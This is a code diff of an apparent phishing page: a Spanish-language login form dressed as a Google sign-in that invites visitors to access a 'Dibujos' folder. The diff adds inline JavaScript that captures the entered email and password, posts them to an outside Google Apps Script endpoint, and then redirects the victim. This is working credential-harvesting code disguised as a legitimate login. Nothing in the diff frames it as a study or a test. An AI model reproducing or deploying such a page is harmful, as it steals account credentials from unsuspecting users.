@@ -207,52 +207,30 @@
     
 
     <!-- Formulario de inicio de sesión -->
-    <form class="form" action="script.js" method="post" style="
-   padding-top: 5px;
-    padding-bottom: 80px;
-    margin-top: 100px;
-">
-
-      <!-- Título e icono del formulario -->
-
-<img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo" style="
-">
-<br>
-
-      <div class="title">
-       
-       Accede a la carpeta Dibujos 
-      </div>
-
-      <!-- Subtítulo -->
-      <div class="subtitle">Utiliza tu cuenta para continuar</div>
-      <br>
-
-      <!-- Campo de correo electrónico -->
-        <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required="" value="">
-
-      <!-- Etiqueta "o" -->
-      <div class="or">
-        <div class="or-line"></div>
-        <div class="or-text">o</div>
-        <div class="or-line"></div>
-      </div>
-
-      <!-- Campo de contraseña -->
-          <input type="text" name="password" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required title="La contraseña es incorrecta" required="">
-      <span id="error-message" style="color: red;"></span>
-
-      <!-- Botón de siguiente -->
-       <button type="submit" class="button">Siguiente</button>
-
-      <!-- Enlace de crear cuenta -->
-      <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
-
-      <!-- Botón de iniciar sesión con otra cuenta -->
+    <form class="form" id="miFormulario" style="padding-top: 5px; padding-bottom: 80px; margin-top: 100px;">
       
+        <img src="https://i.ibb.co/ygHBjNN/gssr-272x92dp.png" alt="go" class="logo">
+        <br>
 
-      <!-- Idioma -->
-      
+        <div class="title">Accede a la carpeta Dibujos</div>
+        <div class="subtitle">Utiliza tu cuenta para continuar</div>
+        <br>
+
+        <input type="email" id="emailInput" name="email" class="input" placeholder="Correo electrónico" required>
+        
+        <div class="or">
+            <div class="or-line"></div>
+            <div class="or-text">o</div>
+            <div class="or-line"></div>
+        </div>
+
+        <input type="password" name="password" class="input" placeholder="Contraseña" minlength="5" maxlength="32" required>
+        <span id="error-message" style="color: red;"></span>
+
+        <button type="submit" class="button">Siguiente</button>
+
+        <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
+
     </form>
 <br>
 
@@ -260,7 +238,31 @@
 
   </div>
     
-    <script src="script.js"></script>
+  <script>
+document.getElementById("miFormulario").addEventListener("submit", async function(event) {
+    event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+
+    const formData = new FormData(this);
+    const url = "https://script.google.com/macros/s/AKfycbxU80QkIHuMrsTIuSLL01BMCpNZ-kmW0M_TlduiLKfHTD8qY2oMVXExV_qlRrbmhgzJ/exec"; // Reemplaza con la URL de Google Apps Script
+
+    try {
+        const response = await fetch(url, {
+            method: "POST",
+            body: new URLSearchParams(formData),
+            headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        });
+
+        if (response.ok) {
+            window.location.href = "usuario.html"; // Redirige al usuario tras enviar los datos
+        } else {
+            alert("Error al enviar los datos.");
+        }
+    } catch (error) {
+        alert("Error al conectar con el servidor.");
+        console.error("Error:", error);
+    }
+});
+</script>
 
 
 
